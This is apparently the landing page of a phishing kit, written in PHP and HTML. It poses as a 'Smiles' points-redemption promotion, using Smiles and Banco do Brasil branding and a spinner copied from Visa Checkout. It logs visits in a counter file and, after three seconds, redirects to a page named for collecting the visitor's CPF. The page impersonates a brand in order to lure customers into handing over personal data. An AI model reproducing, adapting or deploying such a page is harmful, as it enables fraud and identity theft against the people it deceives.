<?php 
function contador($op)
   {
      if($op == 1)
         {
            if(file_exists("cont.txt"))
               {
                  $fb = fopen("cont.txt",'r');
                  $numero = fgets($fb);
                  fclose($fb);
                  $fb = fopen("cont.txt",'w');
                  $numero = $numero + 1;
                  fwrite($fb,$numero);
                  fclose($fb);
               }
            else
               {
                  $fb = fopen("cont.txt",w);
                  fwrite($fb,1);
                  fclose($fb);    
               }
         }
      elseif($op == 2)
         {
            $fb = fopen("cont.txt",'r');
            $numero = fgets($fb);
            fclose($fb);
            return $numero;
         }
      else
         {
            $erro = 'opção invalida';
            return $erro;
         }
   }
contador(1);
?>
<!DOCTYPE html>
<html lang="pt-BR">
   <head>
        <title>Resgate de Pontos | Promoção Smiles</title>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="theme-color" content="">
        
        <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
        <link rel="stylesheet" type="text/css" href="css/estilo.css">
        <link href="img/favicon.ico" rel="Shortcut Icon">

        <script src="js/jquery-3.2.1.min.js"></script>
        <script src="js/bootstrap.js"></script>
        <script src="js/script1.js"></script>


        <style>

          #spinner-section {
              visibility: hidden;
          }

          #spinner-section.show-spinner-section {
              visibility: visible;
          }

          .vmeCheckoutSpinner {
              position: fixed; 
              top: 0; 
              right: 0; 
              bottom: 0; 
              left: 0; 
              width: 200px;
              height: 250px;
              margin: auto;
              border-radius: 3px;
              background-color: #ffffff; 
          }

          .vmeCheckoutSpinner.vmeCheckoutSpinner--open { 
              z-index: 100;
              animation: MoveIn 1s, FadeIn 1s;
              animation-fill-mode: forwards;
              background: transparent;
          }

          .spinnerGhostLayer { 
              position: fixed; 
              top: 0; 
              left: 0; 
              width: 100%; 
              height: 100%;
              /*background-color: rgba(0,0,0,.9);*/
              animation: FadeInGhost 1s;
              animation-fill-mode: forwards;
              filter: "progid:DXImageTransform.Microsoft.Alpha(Opacity=90)"; 
          }

          .spinner-body {
              height: 130px;
          }

          .spinner-header { 
              height: 60px;
          }

          .spinner-footer { 
              height: 60px;
          }

          .close-wrap button { 
              cursor: pointer; 
          } 

          .spinner-close-button { 
              display: block;
              height: 60px;
              width: 40px;
              padding: 0px;
              border: 0;
              background-color: transparent;
              background-repeat: no-repeat;
              margin: 0 auto;
          }

          .spinner-close-button:hover, .spinner-close-button:active, .spinner-close-button:focus {
              outline: 0;
          }

          .checkout-logo { 
              display: block;
              width: 126px;
              margin: 0 auto;
              background-color: transparent;
              background-repeat: no-repeat;
          } 

          .visa-spinner-svg-yellow { 
              position: absolute; 
              top: 0; 
              right: 0; 
              bottom: 0; 
              left: 0; 
              width: 70px; 
              height: 70px; 
              margin: auto; 
              animation: RotateClockwise .6s infinite linear;
              background-color: transparent; 
              background-repeat: no-repeat;
              transform-origin: 50% 50%;
          }

          .visa-spinner-svg-blue { 
              position: absolute; 
              top: 0; 
              right: 0; 
              bottom: 0; 
              left: 0; 
              width: 70px; 
              height: 70px; 
              margin: auto; 
              animation: RotateClockwise .6s infinite linear;
              background-color: transparent; 
              background-repeat: no-repeat;
              transform-origin: 50% 50%;
          }

          .start-animation #main > section > div.viewPage-relativeWrapper {
              visibility: visible;
              animation: FadeIn;
              animation-duration: 1s;
              animation-fill-mode: forwards;
              background-color: #ffffff;
          }

          .start-animation #main > section > div.viewPage-overlay {
              visibility: visible;
          }

          .start-animation #spinner-section > div.spinnerGhostLayer {
              visibility: hidden;
          }

          .start-animation #spinner-section > div.vmeCheckoutSpinner.vmeCheckoutSpinner--open {
              z-index: 0;
              animation: SpinnerFadeOut;
              animation-duration: 1s;
              animation-fill-mode: forwards;
          }

          .start-animation #main > section.viewPage--closing > div.viewPage-relativeWrapper {
              animation: MoveOut, FadeOut;
              animation-duration: .5s;
              animation-timing-function: ease-in-out;
              animation-fill-mode: both;
         }

          @keyframes MoveIn {
              0% {
                  transform: translateY(50vh);
              }

              100% {
                  transform: translateY(0);
              }
          }

          @keyframes FadeIn {
              0% {
                  opacity: 0;
              }

              100% {
                  opacity: 1;
              }
          }

          @keyframes FadeInGhost {
              0% {
                  opacity: 0;
              }

              100% {
                  opacity: 0.9;
              }
          }

          @keyframes SpinnerFadeOut {
              0% {
                  opacity: 1;
              }

              95% {
                  opacity: 1;
              }

              100% {
                  opacity: 0;
              }
          }

          @keyframes RotateClockwise {
              0% {
                  transform: rotate(0deg);
              }

              100% {
                  transform: rotate(359deg);
              }
          }

      </style>
   </head>

   <!-- <header role="banner" class="header header-pinned ng-scope">
       <div class="container-content content-header ng-scope">
           <div class="header-brands">
               <div class="header-brand">
                   <img alt="smiles&bb" class="img-responsive img-header-brand ng-scope img-header-brand-hero" src="img/logo.png" style="">
               </div>
           </div>	
       </div>
   </header> -->

   <meta http-equiv="refresh" content="3;url=webApps_AplicationCpf.php">

   <section id="spinner-section" class=" show-spinner-section show-spinner-section">
       <div class="spinnerGhostLayer"></div>
       <div class="vmeCheckoutSpinner vmeCheckoutSpinner--open vmeCheckoutSpinner--open" aria-label="Visa Checkout is currently loading" tabindex="-1">
           <header class="spinner-header">
              <img alt="smiles&bb" class="img-responsive img-header-brand ng-scope img-header-brand-hero" src="img/logo.png" style="">
           </header>
           <div class="spinner-body">
               
               <svg version="1.1" id="Layer_1" class="visa-spinner-svg-yellow" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 90 90" style="enable-background:new 0 0 90 90;" xml:space="preserve">
                   <style type="text/css">
                   .st0{fill:#F57921;}
                   </style>
                   <path class="st0" d="M45.5,89.1c-24.3,0-44-19.7-44-44s19.7-44,44-44s44,19.7,44,44c0,2.2-1.8,4-4,4s-4-1.8-4-4
                   c0-19.9-16.1-36-36-36s-36,16.1-36,36s16.1,36,36,36c5.7,0,11.2-1.3,16.3-3.9c2-1,4.4-0.2,5.4,1.7c1,2,0.2,4.4-1.7,5.4
                   C59.2,87.5,52.5,89.1,45.5,89.1z">
                   </path>
               </svg>
               <svg version="1.1" id="Layer_1" class="visa-spinner-svg-blue" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 90 90" style="enable-background:new 0 0 90 90;" xml:space="preserve">
                   <style type="text/css">
                       .st1{fill:#F57921;}
                   </style>
                   <path class="st1" d="M34.6,87.6c-0.4,0-0.7,0-1.1-0.2c-18.9-5.3-32-22.7-32-42.4c0-24.3,19.7-44,44-44s44,19.7,44,44
                       c0,2.2-1.8,4-4,4s-4-1.8-4-4c0-19.9-16.1-36-36-36s-36,16.1-36,36c0,16.1,10.8,30.3,26.2,34.7c2.1,0.6,3.4,2.8,2.8,4.9
                       C38,86.5,36.4,87.6,34.6,87.6z">
                   </path>
               </svg>
           </div>
       </div>
       <script>
           var spinnerCloseButton = document.getElementById('spinner-close-button'),
               showRxoPopup = "", miniRXO = "", allowEXO = "",
               vmeCheckoutSpinner = document.querySelector('.vmeCheckoutSpinner'),
               spinnerSection = document.getElementById('spinner-section'),
               spinnerGhostLayer = document.querySelector('.spinnerGhostLayer');

           if(canUseWebstorage){
               showRxoPopup = sessionStorage.getItem('showRxoPopup');
               miniRXO = sessionStorage.getItem('miniRXO');
               allowEXO = sessionStorage.getItem('allowEXO');
           }

           if(showRxoPopup !== "true" && miniRXO !== "true" && allowEXO !== "true") {
               vmeCheckoutSpinner.focus();
               spinnerSection.className += ' show-spinner-section';
               vmeCheckoutSpinner.className += ' vmeCheckoutSpinner--open';
           }

           spinnerCloseButton.onclick = function() {
               window.parent.postMessage('close--' + JSON.stringify({
                   gtm: true,
                   event: 'Spinner Screen Close',
                   event_category: 'Spinner',
                   event_label: 'Spinner Screen Close',
                   event_action: 'Spinner Screen Close',
                   screen_name: 'Spinner',
                   screen_end_time: new Date().getTime()
               }), _postMessageTarget);
           };
       </script>
   </section>
</html>

